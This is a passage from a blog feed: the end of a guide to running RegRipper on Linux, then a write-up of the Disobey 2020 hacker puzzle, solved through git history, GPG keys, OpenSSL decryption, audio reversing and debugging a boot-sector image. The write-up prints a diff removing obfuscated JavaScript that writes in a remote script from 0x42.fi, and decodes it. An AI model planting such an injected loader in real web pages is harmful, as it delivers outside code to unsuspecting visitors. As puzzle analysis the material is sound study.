+<p>First install dependencies we need in running this tool. For some reason at the time I am writing this blogpost, tests fail after building the Win32Registry module. For this reason, we need to use more force in installation. If you don&rsquo;t want to install the module to the default location, you may want to use -l parameter to give an it another location (f.e. /usr/share/regripper/perlmodules/).</p>
+<pre tabindex="0"><code>$ sudo apt-get update &amp;&amp; sudo apt-get install -y cpanminus git
+$ sudo cpanm Parse::Win32Registry --force
+</code></pre><p>After installing the dependencies, we clone the repo.</p>
+<pre tabindex="0"><code>$ git clone https://github.com/keydet89/RegRipper2.8.git
+$ cd RegRipper2.8/
+</code></pre><p>As the script is made for Windows, we need to tune it a little. I am going to move the plugins to /usr/share/regripper/ so I need to sed the path into the script. I also want to uncomment all the Linux stuff.</p>
+<pre tabindex="0"><code>$ tail -n +2 rip.pl &gt; rip
+$ perl -pi -e 'tr[\r][]d' rip
+$ sed -i &quot;1i #\!$(which perl)&quot; rip
+$ sed -i 's/\#my\ \$plugindir/\my\ \$plugindir/g' rip
+$ sed -i 's/\#push/push/' rip
+$ sed -i 's/\&quot;plugins\/\&quot;\;/\&quot;\/usr\/share\/regripper\/plugins\/\&quot;\;/' rip
+$ sed -i 's/(\&quot;plugins\&quot;)\;/(\&quot;\/usr\/share\/regripper\/plugins\&quot;)\;/' rip
+</code></pre><p>Now move the plugins to /usr/share/regripper</p>
+<pre tabindex="0"><code>$ sudo mkdir -p /usr/share/regripper/
+$ sudo cp -r plugins/ /usr/share/regripper/
+</code></pre><p>Lastly we need to move our new script to path and reload our configuration</p>
+<pre tabindex="0"><code>$ sudo mv rip /usr/local/bin/rip.pl
+$ chmod +x /usr/local/bin/rip.pl
+$ source ~/.bashrc
+</code></pre><p>Now running rip.pl -c -l shoud list you all plugins. :)</p>
+<pre tabindex="0"><code> whois@ghost  ~  rip.pl -c -l
+Plugin,Version,Hive,Description
+ssh_host_keys,20120809,NTUSER.DAT,Extracts Putty/WinSCP SSH Host Keys
+typedurlstime,20120613,NTUSER.DAT,Returns contents of user's TypedURLsTime key.
+fw_config,20080328,System,Gets the Windows Firewall config from the System hive
+yahoo_lm,20101219,SOFTWARE,Yahoo Messenger parser
+...
+
+
+ whois@ghost  ~/Courses/MemForensics/materials/registry  rip.pl -r registry.0xffffbb02f1b77000.SAM.reg -p samparse
+Launching samparse v.20160203
+samparse v.20160203
+(SAM) Parse SAM file for user &amp; group mbrshp info
+
+
+User Information
+-------------------------
+Username        : Administrator [500]
+SID             : S-1-5-21-4219245480-2226696944-1083947594-500
+Full Name       : 
+User Comment    : Built-in account for administering the computer/domain
+Account Type    : 
+Name            :  
+Last Login Date : Never
+Pwd Reset Date  : Never
+Pwd Fail Date   : Never
+Login Count     : 0
+  --&gt; Normal user account
+  --&gt; Password does not expire
+  --&gt; Account Disabled
+...
+</code></pre>]]></content></item><item><title>[0x03] Disobey 2020 puzzle writeup</title><link>https://who1s.github.io/posts/2019/12/0x03-disobey-2020-puzzle-writeup/</link><pubDate>Mon, 23 Dec 2019 06:00:00 +0000</pubDate><guid>https://who1s.github.io/posts/2019/12/0x03-disobey-2020-puzzle-writeup/</guid><description>Disobey is a Finnish hacker/cyber security conference. They release every year a hacker challenge and 50 first who solve it, get to buy the special &amp;ldquo;hacker ticket&amp;rdquo; with a cheaper price than a regular ticket. The badge that comes with the ticket is also visually different looking than a normal ticket. At the first I have to admit, this year the challenge was harder than in previous years. This was my third time I tried to do the challenge and the third time I managed to solve it.</description><content type="html"><![CDATA[<p><img src="/assets/images/disobey_owls.jpg" alt="image"></p>
+<blockquote>
+<p><a href="https://disobey.fi">Disobey</a> is a Finnish hacker/cyber security conference. They release every year a hacker challenge and 50 first who solve it, get to buy the special &ldquo;hacker ticket&rdquo; with a cheaper price than a regular ticket. The badge that comes with the ticket is also visually different looking than a normal ticket. At the first I have to admit, this year the challenge was harder than in previous years. This was my third time I tried to do the challenge and the third time I managed to solve it. As the challenge started at the same weekend as Assembly LAN party was held, we decided to give it a try together with <a href="https://www.twitter.com/dist">Dist</a> and <a href="https://www.twitter.com/jaroneko">Jaroneko</a> as a team. There&rsquo;s probably multiple different ways to solve it but here&rsquo;s my take with some arguments why I did what I did. Hope you enjoy the read and even learn something from it!</p>
+</blockquote>
+<h1 id="_start">_start</h1>
+<p>Disobey has a &ldquo;DISOBEY PUZZLE&rdquo; partition on their webpage with a link. When you click the link open, <a href="https://disobey2020.github.io/">Gitbub pages site</a> should open. GH pages are a way to host website from a github repo. Probably we can find something from <a href="https://github.com/disobey2020/disobey2020.github.io">Github</a> then&hellip;?</p>
+<p>The repository was a lot different looking back then than it is today. People have made lot of pull requests and most of them have been accepted. This kinda makes the commit history harder to read but let&rsquo;s see what&rsquo;s in there. I cloned the repo and ran &ldquo;git log&rdquo; against it.</p>
+<pre tabindex="0"><code> whois@cypher → ~/gits/ → git clone https://github.com/disobey2020/disobey2020.github.io
+ whois@cypher → ~/gits/ → cd disobey2020.github.io
+ whois@cypher → ~/gits/disobey2020.github.io → ↑ master → git log
+
+commit 9ca710048f495d4ccf25ac268a432d75dda010ee
+Merge: 8811b77 4517bd0
+Author: disobey2020 &lt;53083375+disobey2020@users.noreply.github.com&gt;
+Date:   Wed Jul 24 11:53:50 2019 +0300
+
+    Merge pull request #3 from disobey2020/vuln_fix
+
+    Removed malicious code
+
+commit 8811b77cf362f3cf97765f03fd367f9590ffc101
+Author: Diso Bey &lt;disobey2020@io.fi&gt;
+Date:   Fri Jul 19 16:46:19 2019 +0300
+
+    Add robots.txt
+
+commit cf2e99542f8c9d6fe1df86d6bb2804c02f20c95e
+Author: disobey2020 &lt;53083375+disobey2020@users.noreply.github.com&gt;
+Date:   Fri Jul 19 14:53:00 2019 +0300
+
+    Create README
+
+commit af88c9a987df81cfc5d0ea8f0d413d9890143026
+Merge: a8e04ac 0ac77ce
+Author: disobey2020 &lt;53083375+disobey2020@users.noreply.github.com&gt;
+Date:   Fri Jul 19 14:51:25 2019 +0300
+
+    Merge pull request #1 from 0x4141414141414141/effect
+
+    Add cool effect to the header text
+
+commit 0ac77ce7b261eaad945219cd2b1349fc7041a814
+Author: AAAAAAAA &lt;0x41414141414141@protonmail.com&gt;
+Date:   Fri Jul 19 14:47:12 2019 +0300
+
+    Add cool effect to the header text
+
+commit a8e04ac1e014ef0aaf55eb6daadd6a6d66a349e1
+Author: Diso Bey &lt;disobey2020@io.fi&gt;
+Date:   Mon Jul 1 01:01:01 2019 +0300
+
+    Initial commit
+
+commit 4517bd04e348c331837fa8833810cbba465618c9
+Author: Diso Bey &lt;disobey2020@io.fi&gt;
+Date:   Thu May 16 01:00:45 2019 +0300
+
+    Removed malicious code
+
+</code></pre><p>The first thing I saw was the commit 4517bd04e348c331837fa8833810cbba465618c9. I really wanted to know what the malicious code was so I checked the specific commit.</p>
+<pre tabindex="0"><code>whois@cypher → ~/gits/disobey2020.github.io → ↑ master → git show 4517bd04e348c331837fa8833810cbba465618c9
+
+commit 4517bd04e348c331837fa8833810cbba465618c9
+Author: Diso Bey &lt;disobey2020@io.fi&gt;
+Date:   Thu May 16 01:00:45 2019 +0300
+
+    Removed malicious code
+
+diff --git a/index.html b/index.html
+index 6f95a95..6045303 100755
+--- a/index.html
++++ b/index.html
+@@ -53,9 +53,6 @@
+                          crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+   &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/animejs/2.0.2/anime.min.js&quot;&gt;&lt;/script&gt;
+   &lt;script&gt;
+-var _0x4311=['.fi','/ma','l.js','write','&lt;script\x20src=\x22','s://','0x42'];(function(_0x426e03,_0x359476){var _0x17c635=function(_0x5dfa16){while(--_0x5dfa16){_0x426e03['push'](_0x426e03['shift']());}};_0x17c635(++_0x359476);}(_0x4311,0x9f));var _0x5a74=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x4311[_0x2d8f05];return _0x4d74cb;};var f1='hT';var f2='tP';var f3=_0x5a74('0x0');var f4=_0x5a74('0x1');var f5=_0x5a74('0x2');var f6=_0x5a74('0x3');var f7=_0x5a74('0x4');document[_0x5a74('0x5')](_0x5a74('0x6')+f1+f2+f3+f4+f5+f6+f7+'\x22&gt;&lt;\/script&gt;');
+-  &lt;/script&gt;
+-  &lt;script&gt;
+   // Wrap every letter in a span
+   $('.ml9 .letters').each(function(){
+     $(this).html($(this).text().replace(/([^\x00-\x80]|\w)/g, &quot;&lt;span class='letter'&gt;$&amp;&lt;/span&gt;&quot;));
+</code></pre><p>Nasty! Index.html has had some obfuscated JavaScript in it. I know lot of people run this kind of stuff on their host&rsquo;s browser but as I do this kind of analysis as my work, I would not recommend doing it. To analyze this JS, I ran it with SpiderMonkey on my Remnux virtual machine. Remnux ships with a tool called SpiderMonkey. SpiderMonkey is a tool for evaling obuscated JS.</p>
+<pre tabindex="0"><code>remnux@remnux:~/disobey$ js -f /usr/share/remnux/objects.js -f mal.js 
+&lt;script src=&quot;hTtPs://0x42.fi/mal.js&quot;&gt;&lt;/script&gt;
+</code></pre><p>Okay so the obfuscated JS just loads another JS to the website from suspicious domain 0x42.fi. Unfortunately, 0x42.fi resolves to localhost. Let&rsquo;s see other DNS record types as well than just the A record.</p>
+<pre tabindex="0"><code> whois@cypher → ~/gits/disobey2020.github.io → ↑ master → host 0x42.fi
+
+0x42.fi has address 127.0.0.1
+
+ whois@cypher → ~/gits/disobey2020.github.io → ↑ master → host -t TXT 0x42.fi
+0x42.fi descriptive text &quot;if you are doing bruteforcing, or domain / ip recon you are doing it wrong. The glaciers are shrinking fast enough without that.&quot;
+0x42.fi descriptive text &quot;See first, think later, then test. But always see first. Otherwise you will only see what you were expecting. Most scientists forget that.&quot;
+0x42.fi descriptive text &quot;ca3-cb8d6ea4479349af8295f8ea0115af57&quot;
+0x42.fi descriptive text &quot;History data for this domain is out of scope.&quot;
+0x42.fi descriptive text &quot;Can't we have nice things?      [in narrator voice]: 'They could not'&quot;
+0x42.fi descriptive text &quot;If you didn't know history, you didn't know anything. You were a leaf that didn't know it was part of a tree.&quot;
+
+ whois@cypher → ~/gits/disobey2020.github.io → ↑ master → host -t AAAA 0x42.fi
+0x42.fi has no AAAA record
+
+ whois@cypher → ~/gits/disobey2020.github.io → ↑ master → host -t MX 0x42.fi
+0x42.fi has no MX record
+
+ whois@cypher → ~/gits/disobey2020.github.io → ↑ master → host -t CNAME 0x42.fi
+0x42.fi has no CNAME record
+</code></pre><p>As we can see, only TXT record returns us something. By little googling, ca3-md5hash seems to have something to do with let&rsquo;s encrypt so probably it is nothing. I guess these phrases are just a verbal finger for the solver so let&rsquo;s start all over again.</p>
+<p>We can see from the commit history that the malicious code was added to the repository in the following commit.</p>
+<pre tabindex="0"><code>commit 0ac77ce7b261eaad945219cd2b1349fc7041a814
+Author: AAAAAAAA &lt;0x41414141414141@protonmail.com&gt;
+Date:   Fri Jul 19 14:47:12 2019 +0300
+
+    Add cool effect to the header text
+</code></pre><p>User 0x4141414141414141 looks interesting. Protonmail and everything, very suspicious&hellip; Let&rsquo;s look how their Github looks&hellip;</p>
+<p><img src="/assets/images/mrAAA.png" alt="image"></p>
+<p>We can see emojis 💭 and 🔑 below the avatar. This must have something to do with a challenge&hellip; This user has one repo, which has three files and they all are called &ldquo;Keyholes&rdquo;. The emojis must be a hint how to open these keyfiles. Let&rsquo;s clone the files and let&rsquo;s see what they are.</p>
+<pre tabindex="0"><code> whois@cypher → ~/gits → git clone https://github.com/0x4141414141414141/proof.git
+Cloning into 'proof'...
+remote: Enumerating objects: 9, done.
+remote: Counting objects: 100% (9/9), done.
+remote: Compressing objects: 100% (8/8), done.
+remote: Total 9 (delta 1), reused 8 (delta 0), pack-reused 0
+Unpacking objects: 100% (9/9), done.
+ whois@cypher → ~/gits → cd proof
+ whois@cypher → ~/gits/proof → ↑ master → l
+total 13824
+drwxr-xr-x   6 whois  staff   192B Nov 20 00:08 .
+drwxr-xr-x  11 whois  staff   352B Nov 20 00:08 ..
+drwxr-xr-x  12 whois  staff   384B Nov 20 00:08 .git
+-rw-r--r--   1 whois  staff   6.6M Nov 20 00:08 keyhole
+-rw-r--r--   1 whois  staff   1.5K Nov 20 00:08 keyhole2
+-rwxr-xr-x   1 whois  staff   130K Nov 20 00:08 keyholekeyhole2_pbkdf2
+ whois@cypher → ~/gits/proof → ↑ master → file *
+keyhole:                openssl enc'd data with salted password
+keyhole2:               openssl enc'd data with salted password
+keyholekeyhole2_pbkdf2: openssl enc'd data with salted password
+</code></pre><p>As we can see from the output, files are openssl encrypted data. Now I guess we have to find the passwords for those &ldquo;keyholes&rdquo;. Let&rsquo;s go back and investigate the specific commit more&hellip; Keys usually have something to do with PGP and git commits are signed with PGP&hellip; Let&rsquo;s see what the signature says in this specific commit.</p>
+<pre tabindex="0"><code> whois@cypher → ~/gits/disobey2020.github.io → ↑ master → git show --show-signature 0ac77ce7b261eaad945219cd2b1349fc7041a814
+commit 0ac77ce7b261eaad945219cd2b1349fc7041a814
+gpg: Signature made Fri Jul 19 14:47:12 2019 EEST
+gpg:                using RSA key 1F8DA40B1C5CEA3352D5654665F67D98EBE27E12
+gpg: Good signature from &quot;AAAAAAAA (SKS Keyserver Network Under Attack) &lt;not@valid&gt;&quot; [unknown]
+gpg:                 aka &quot;AAAAAAAA (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) &lt;0x41414141414141@protonmail.com&gt;&quot; [unknown]
+gpg: WARNING: This key is not certified with a trusted signature!
+gpg:          There is no indication that the signature belongs to the owner.
+Primary key fingerprint: 1F8D A40B 1C5C EA33 52D5  6546 65F6 7D98 EBE2 7E12
+Author: AAAAAAAA &lt;0x41414141414141@protonmail.com&gt;
+Date:   Fri Jul 19 14:47:12 2019 +0300
+
+    Add cool effect to the header text
+</code></pre><p>My first though was &ldquo;what is this SKS Keyserver Network Under Attack shit&rdquo; and I decided to use every hacker&rsquo;s secret tool Google to solve it. I felt lucky and ended up to <a href="https://gist.github.com/rjhansen/67ab921ffb4084c865b3618d6955275f">this Github page</a>. After reading the article and understanding some of it, I tried to retrieve this key from a server.</p>
+<pre tabindex="0"><code>whois@cypher → ~/gits/disobey2020.github.io → ↑ master → gpg --search-keys 1F8DA40B1C5CEA3352D5654665F67D98EBE27E12
+gpg: data source: https://192.146.137.99:443
+(1)	AAAAAAAA (SKS Keyservers under attack) &lt;not@valid&gt;
+	AAAAAAAA (SKS Keyserver Network Under Attack) &lt;not@valid&gt;
+	AAAAAAAA (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) &lt;0x41414
+	  4096 bit RSA key 65F67D98EBE27E12, created: 2019-07-19, expires: 2020-07-18
+Keys 1-1 of 1 for &quot;1F8DA40B1C5CEA3352D5654665F67D98EBE27E12&quot;.  Enter number(s), N)ext, or Q)uit &gt; n
+</code></pre><p>It looks like I got the same key right? Let&rsquo;s fix my GPG configuration before retrying the way previosly mentioned Github page says.</p>
+<pre tabindex="0"><code> whois@cypher → ~/gits/disobey2020.github.io → ↑ master → gpg --search-keys 1F8DA40B1C5CEA3352D5654665F67D98EBE27E12
+gpg: data source: https://keys.openpgp.org:443
+(1)	AAAAAAAA (5768657265446F6573546869734B65794669743F) &lt;0x41414141414141@
+	AAAAAAAA (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) &lt;0x41414
+	  4096 bit RSA key 65F67D98EBE27E12, created: 2019-07-24
+Keys 1-1 of 1 for &quot;1F8DA40B1C5CEA3352D5654665F67D98EBE27E12&quot;.  Enter number(s), N)ext, or Q)uit &gt; n
+</code></pre><p>Now we seem to have different key with different uid. Uid description looks like hexa, is it?</p>
+<pre tabindex="0"><code> whois@cypher → ~/gits/disobey2020.github.io → ↑ master → echo &quot;5768657265446F6573546869734B65794669743F&quot; |xxd -r -p
+WhereDoesThisKeyFit?%
+</code></pre><p>It indeed was. :D Now we have a key and earlier we got keyholes, let&rsquo;s see if our retrieved key fits the hole&hellip;</p>
+<pre tabindex="0"><code> whois@cypher → ~/gits/proof → ↑ master → rm file
+ whois@cypher → ~/gits/proof → ↑ master → openssl enc -d -aes-256-cbc -md sha256 -in keyhole -out file
+enter aes-256-cbc decryption password:
+ whois@cypher → ~/gits/proof → ↑ master → file file
+file: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 44100 Hz
+ whois@cypher → ~/gits/proof → ↑ master → mv file file.riff
+ whois@cypher → ~/gits/proof → ↑ master → openssl enc -d -aes-256-cbc -md sha256 -in keyhole2 -out file
+enter aes-256-cbc decryption password:
+ whois@cypher → ~/gits/proof → ↑ master → file file
+file: DOS/MBR boot sector
+ whois@cypher → ~/gits/proof → ↑ master → mv file bootloader
+ whois@cypher → ~/gits/proof → ↑ master → openssl enc -d -aes-256-cbc -md sha256 -in keyholekeyhole2_pbkdf2 -out file
+enter aes-256-cbc decryption password:
+bad decrypt
+4510240364:error:06FFF064:digital envelope routines:CRYPTO_internal:bad decrypt:/BuildRoot/Library/Caches/com.apple.xbs/Sources/libressl/libressl-47.11.1/libressl-2.8/crypto/evp/evp_enc.c:521:
+</code></pre><p>Okay, so the retrieved password worked to keyhole and keyhole2 but not to keyholekeyhole2_pbkdf2. To be honest here, the decryption wasn&rsquo;t that smooth while doing the challenge first time. Organizers said bruteforcing is not needed in the challenge but at least I had to try [hard] all ciphers and digests before I managed to open the first keyhole. Also funny note, depending on the OpenSSL version default digest might be different. On OS X I had LibreSSL 2.8.3 which has SHA1 as defaul digest while on my Manjaro machine with OpenSSL 1.1.1d the default digest is SHA256.</p>
+<h1 id="keyhole">keyhole</h1>
+<p>Let&rsquo;s move forward. We have now two different files: somekind of sound file and a DOS/MBR boot sector. Let&rsquo;s start with the soundfile.</p>
+<figure >
+<audio controls preload="metadata">
+<source src="/assets/sound/m%c3%b6rk%c3%b6.wav" type="audio/mpeg">
+
+</audio>
+</figure>
+
+<p>It plays nicely and sounds like a bogey (&ldquo;MÖRKÖ&rdquo;). :D It also sounds the tape is backwards so let&rsquo;s try to reverse it. As I don&rsquo;t know that much about signals and stuff and have only resolved these kind of challenges in CTFs, I will use noobfriendly tool Audacity for reversing. The reversing process was pretty easy in Audacity. Let&rsquo;s here what the mörkö has to say backwards.</p>
+<figure >
+<audio controls preload="metadata">
+<source src="/assets/sound/m%c3%b6rk%c3%b6reversed.wav" type="audio/mpeg">
+
+</audio>
+</figure>
+
+<p>Sounds like the bogey is pronouncing some numbers right? Let&rsquo;s try to clear up the back noise so we can here what he has to say.</p>
+<figure >
+<audio controls preload="metadata">
+<source src="/assets/sound/m%c3%b6rk%c3%b6cleaned.wav" type="audio/mpeg">
+
+</audio>
+</figure>
+
+<p>Alrighty, now we can here the numbers loud an clear. No matter how many times I listen it, I get the following sequence of numbers:</p>
+<pre tabindex="0"><code>1010101010568605568605568605379037968605
+</code></pre><p>This sequence doesn&rsquo;t really return anything that makes sense. If we reverse the string and then turn it into ascii from hexa, we get some printable characters but it doesn&rsquo;t make sense.</p>
+<pre tabindex="0"><code>whois@cypher → ~/gits/proof → ↑ master → echo &quot;1010101010568605568605568605379037968605&quot; |rev|xxd -r -p
+Phis	sPhePhePhe%
+</code></pre><p>This was the phase we were stuck for almost 36 hours&hellip; :D Those 36 hours were pretty long especially when we managed to solve the whole challenge in 4 days! BUT.. let&rsquo;s assume the first letter is &lsquo;T&rsquo; so that the string would start with a English word &lsquo;This&rsquo;. Hex value of capital &lsquo;T&rsquo; is 54. What if instead of &ldquo;ou&rdquo; the bogey is trying to say &ldquo;four&rdquo; ? Let&rsquo;s try that.</p>
+<pre tabindex="0"><code> whois@cypher → ~/gits/proof → ↑ master → echo &quot;1010101010568605568605568605379037968605&quot; |tr '0' '4'|rev|xxd -r -p
+ThisIsTheTheTheAAAAA%
+</code></pre><p>Boom!!! Looks like we solved the bogey and opened our first keyhole. Based on the keyhole names, this is probably the first part of a password that fits the keyholekeyhole2_pbkdf2. The password string also supports our story.</p>
+<h1 id="keyhole2">keyhole2</h1>
+<p>Now we get into the business: DOS/MBR boot sector image file. Oh boy, this is gonna be <a href="https://twitter.com/_k4m1_">K4M1</a> level good once again.</p>
+<pre tabindex="0"><code>whois@cypher → ~/gits/proof → ↑ master → file bootloader
+bootloader: DOS/MBR boot sector
+</code></pre><p>Running strings against the image just prints us a &ldquo;Invalid CPU!&rdquo;. I never though strings could tell us anything but it is always worth to try (protip: sometimes piping grep with strings is good as well, ping iiro). So let&rsquo;s roll up our sleeves and start debugging&hellip; As I happen to have access to IDA Pro, I used it for debugging. It doesn&rsquo;t really matter which debugger/disassembler you use&hellip; You can easily do the task with radare2 or ghidra. =)</p>
+<p>So, the most common architectures what I have seen are ARM, i386, x86 and x64. As ARM emulating with QEMU did not work, I tried i386 and managed to run the program on my Windows virtual machine. I started QEMU with following parameters to enable multiple serials, allocate enough memory for it, to enable remote debugging and to pause execution at the start. Without pausing the execution, I got print &ldquo;WRONG&rdquo; on the serial0 console window.</p>
+<p><img src="/assets/images/qemu0.png" alt="image"></p>
+<pre tabindex="0"><code>C:\Users\Rodrigo Gonzales&gt;&quot;C:\Program Files\qemu\qemu-system-i386.exe&quot; -drive format=raw,file=Desktop/bootloader -serial vc -serial vc -serial vc -serial vc -m 512 -S -s
+</code></pre><p>Little googling about bootloaders gave a hint that bootloader should be initiazlied at 0x7C00. I set a breakpoint to that address and let the program continue. After getting there, I saw some kind of unpacking function starting&hellip; Single stepping was painful so I decided to let the program run for a while.</p>
+<p>After stopping the software, I saw we ended up seeing the &ldquo;WRONG&rdquo; text in our serial0 and EIP was at 0x3028. The loop function at that location seemed to write some shit to addresses between 0x2328 and 0x303F. At the time, there was some still some ascii characters in addresses between 0x3000 and 0x3027. Now we roughly know that probably there&rsquo;s something in this address space. I decided to re-run the program and set breakpoint to 0x3000, which had hex-value 0x66 (ascii letter f) at this point.</p>
+<p>The execution reached the breakpoint and oh boy, we can see assembly once again!!!</p>
+<p><img src="/assets/images/ida1.png" alt="image"></p>
+<p>The first instructions don&rsquo;t look that interesting as it seems they are just defining some register values and checking CPU architecture. The jump to 0x303F takes us to start of the program.</p>
+<pre tabindex="0"><code>MEMORY:0000303F loc_303F:                               ; CODE XREF: MEMORY:00003010↑j
+MEMORY:0000303F mov     dx, 3F8h
+MEMORY:00003043 mov     si, 3157h
+MEMORY:00003047 mov     cx, 317Fh
+MEMORY:0000304B rep outsb
+MEMORY:0000304D xor     al, al
+MEMORY:0000304F jz      short near ptr loc_3051+1
+</code></pre><p><img src="/assets/images/qemu1.png" alt="image"></p>
+<p>At 0x304B program prints &ldquo;Place flag to 0x3000 in RAM please :)&rdquo;. After that AL is cleared with XOR and the execution continues. At 0x304F is suspicious jump instruction to function at 0x3051+1, which is not dissassembled in the IDA. Function at 0x3051 looks shady thou:</p>
+<p><img src="/assets/images/ida2.png" alt="image"></p>
+<p>Let&rsquo;s try to undefine it and re-analyze with IDA.</p>
+<p><img src="/assets/images/ida3.png" alt="image"></p>
+<p><img src="/assets/images/ida4.png" alt="image"></p>
+<p><img src="/assets/images/ida5.png" alt="image"></p>
+<p>After re-analyze the function looks a lot better. We can see that the program compares the first letter of the memory address 0x3000 to 0x42, which is letter B. If the first letter is not B (comparasion between AL and the first letter of our flag is not zero), the jump will be taken to loc_3114. That location is the place where the &ldquo;WRONG&rdquo; we saw first is written to the TTY.</p>
+<p><img src="/assets/images/ida6.png" alt="image"></p>
+<p>Next instruction decreases value of AL by one so it becomes 0x41 (A). After that the second letter of our flag at byte_3001 is compared to AL value (0x41) and if they are equal, jump to loc_3114 (&ldquo;WRONG)&quot;) is taken.</p>
+<p><img src="/assets/images/ida7.png" alt="image"></p>
+<p>At 0x307D next byte in our flag is re-compared to 0x42 (B). By that, we know that the first two letters in the flag are BB.</p>
+<p><img src="/assets/images/ida8.png" alt="image"></p>
+<p>As we can see from the previous image, at 0x308A two bytes (word) from our flag are being loaded to EAX. These two bytes are the 5th and the 6th letter of our flag. AL register is the second part of EAX and compared first. As we can see from the instuctions, hex-value 32 is added to value of AL and then compared to 0x7B. This means our fifth letter is 0x7b ({) - 0x32 = 0x49 (I). Reversed flag so far: BB__I (__ are unknown letters at this point)</p>
+<p>At 0x309D hex-value 20 is being reduced from the value of the first byte of our word and then compared to hex-value 54.  By reversing this very hard mathematical function, we get the value 0x74 (0x54+0x20) which tranforms to ascii letter t. Reversed flag so far: BB__It</p>
+<p><img src="/assets/images/ida9.png" alt="image"></p>
+<p>The next mov to AX is from word_3002. Then the register is being pushed and BX popped. This sequence copies the AX value to BX.</p>
+<p>As we can see from the operand, the value of word_3002 can be calculated by undoing AND operation to 0x0202 with 0x0F0F.</p>
+<pre tabindex="0"><code>XXXX XXXX XXXX XXXX 
+0000 1111 0000 1111
+-------------------
+0000 0010 0000 0010
+
+--&gt;
+
+1111 0010 1111 0010: F2F2
+</code></pre><p>Let&rsquo;s continue. Next we compare the value stored to BX with similar function.</p>
+<pre tabindex="0"><code>MEMORY:000030B9 xor     bx, 202h
+MEMORY:000030BE cmp     bx, 4040h
+</code></pre><p>This time it&rsquo;s XOR instead of AND. Now we know that result of our BX value with 0x0202 should be 0x4040.</p>
+<pre tabindex="0"><code>XXXX XXXX XXXX XXXX 
+0000 1111 0000 1111
+-------------------
+0100 0000 0100 0000
+
+--&gt;
+
+0100 0000 0100 0000: 4040
+</code></pre><p>As we can see, the 3rd and 4th character are being compared in two different operations. By combining these two values we get 4242 (BB). Reversed flag so far: BBBBIt</p>
+<p>Next the function at loc_3127 is being called. The function has some kind of loop, where the start address is 0x3000 and the end address 0x3157. The loop compares if any byte of the flag at 0x3000 has value 0xDA.</p>
+<p><img src="/assets/images/ida10.png" alt="image"></p>
+<p>I set up a breakpoint to 0x3141 and the execution finally rechead it. We might need to come back here and continue debugging if the 0xDA should be in our flag. At this point I thought it&rsquo;s highly unlike as the Ascii value of 0xDA is Ú.</p>
+<p>Return takes us back to 0x30CA where we jump to 0x30D1. At 0x30D1 our next characters gets loaded to EAX. Next the software increases AL value by one at 0x30D6. After that we jump to 0x30DE where the AL gets compared to 0x47 (G). As we just increased the value by 1, the 7th letter is 0x47 - 1 = 0x46 (F). Now we know the password starts BBBBItF.</p>
+<p><img src="/assets/images/ida11.png" alt="image"></p>
+<p>Next the programn shifts EAX 8 bits with SHR. After that AL is being checked not to be 0x47 (G). As the jump is taken to WRONG only if letter equals to G, we can ignore the shr instruction at this point. In 0x30e9 AL is compared to 0x69 (i) and then the execution continues. By that i seems to be our 8th character. Reversed flag so far: BBBBItFi</p>
+<p>The next part is once again kinda shady. We have a jump to loc_30EF+2 which is loc_30F1, how ever the dissassembled code does not show us this location. Let&rsquo;s try to jump there and then re-analyze the address.</p>
+<p>Before:
+<img src="/assets/images/ida12.png" alt="image"></p>
+<p>After:
+<img src="/assets/images/ida13.png" alt="image"></p>
+<p>It worked =). At 0x30F1 latter word from EAX is shifted to AX and at 0x30F4 hex-values 0x73 and 0x74 are being compared to it. Hex-values 0x73 and 0x74 are ascii letters t and s. Reversed flag: BBBBItFits</p>
+<p>After the operation, &ldquo;Correct&rdquo; is printed to TTY0 at 0x3106. At last we can try our reversed flag by inserting it to memory address 0x3000 and letting the program to execute.</p>
+<p><img src="/assets/images/ida14.png" alt="image"></p>
+<p><img src="/assets/images/qemu2.png" alt="image"></p>
+<p>Whoop whoop, thanks a lot @K4M1 for the fun ride!</p>
+<h1 id="keyholekeyhole2_pbkdf2">keyholekeyhole2_pbkdf2</h1>
+<p>If we combine the flags we got from keyhole and keyhole2, we get the assumed masterkey for the last known keyhole.</p>
+<pre tabindex="0"><code>ThisIsTheTheTheAAAAABBBBItFits
+</code></pre><p>Let&rsquo;s fire away our last keyhole with the key. =)</p>
+<pre tabindex="0"><code> whois@cypher → ~/gits/proof → ↑ master → openssl enc -d -aes-256-cbc -md sha256 -salt -pbkdf2 -in keyholekeyhole2_pbkdf2 -out lasthole
+enter aes-256-cbc decryption password:
+
+ whois@cypher → ~/gits/proof → ↑ master → Desktop file lasthole 
+lasthole: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: &quot;https://db.0n.fi/&quot;, progressive, precision 8, 1600x1200, components 3
+</code></pre><p>Great, we have a picture, I love stegano (NOT). Let&rsquo;s see how bad it looks&hellip;</p>
+<p><img src="/assets/images/lasthole.jpg" alt="image"></p>
+<p>So&hellip; It&rsquo;s once again some boogeyman stuff. If we lighten the picture a little, we can see that the balloons have a string &ldquo;mehram&rdquo; written in them. Mehram is anagram for &ldquo;hammer&rdquo; and if we read balloons from the smallest to biggest, we get also the string &ldquo;hammer&rdquo;.</p>
+<p><img src="/assets/images/mehram.png" alt="image"></p>
+<pre tabindex="0"><code> whois@cypher → ~/gits/proof → ↑ master → exiftool lasthole.jpg
+ExifTool Version Number         : 11.59
+File Name                       : lasthole.jpg
+Directory                       : .
+File Size                       : 130 kB
+File Modification Date/Time     : 2019:12:19 21:56:54+02:00
+File Access Date/Time           : 2019:12:19 21:59:06+02:00
+File Inode Change Date/Time     : 2019:12:19 21:59:05+02:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 72
+Y Resolution                    : 72
+Comment                         : https://db.0n.fi/.Q2FuJ3QgVG91Y2ggVGhpcw==
+Image Width                     : 1600
+Image Height                    : 1200
+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 1600x1200
+Megapixels                      : 1.9
